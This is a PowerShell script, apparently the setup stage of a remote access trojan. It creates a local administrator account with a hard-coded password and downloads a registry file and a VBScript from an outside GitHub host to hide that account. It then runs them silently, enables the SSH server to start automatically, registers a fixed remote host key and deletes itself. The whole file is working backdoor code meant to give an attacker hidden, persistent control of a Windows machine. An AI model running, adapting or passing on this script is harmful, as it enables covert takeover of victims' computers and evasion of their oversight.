# build resources for rat 
# created by : Sulaxshayan

# Function to generate random strings for directory and file names
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
}

# Function to create a local admin account for RAT
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )    
    begin {
        Write-Verbose "Starting the process to create a new local admin..."
    }    
    process {
        New-LocalUser -Name $uname -Password $pword -FullName $uname -Description "Temporary local admin"
        Write-Verbose "New local user '$uname' created successfully."
        Add-LocalGroupMember -Group "Administrators" -Member $uname
        Write-Verbose "'$uname' added to the local administrators group."
    }    
    end {
        Write-Verbose "Process completed."
    }
}

# Variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = Get-Location 


# Create local admin account
$uname = "firstnameAttempt"
$pword = ConvertTo-SecureString "onlyrat1234" -AsPlainText -Force
create_account -uname $uname -pword $pword -Verbose

# Create a working directory in the temp folder and navigate to it
mkdir $path
Set-Location $path

# Download registry file to hide the local admin
$reg_file = random_text
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NSulaxshayan/Malware_Analysis/main/files/admin.reg" -OutFile "$reg_file.reg"

# Download Visual Basic script to execute the registry changes
$vbs_file = random_text
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NSulaxshayan/Malware_Analysis/main/confirm.vbs" -OutFile "$vbs_file.vbs"

# Enable and configure OpenSSH Server
# Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh
ssh-keyscan.exe -H 192.168.159.129 >> $env:USERPROFILE\.ssh\known_hosts

# Execute the downloaded registry and VBS files
Start-Process -FilePath "regedit.exe" -ArgumentList "/s $reg_file.reg" -Wait
Start-Process -FilePath "wscript.exe" -ArgumentList "$vbs_file.vbs" -Wait

# Self-delete the script (cannot delete while running)
$script_path = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 10  # Wait a bit to ensure all tasks are completed
Remove-Item $script_path -Force

# Navigate back to the initial directory
Set-Location $initial_dir

Write-Output "Script execution completed."

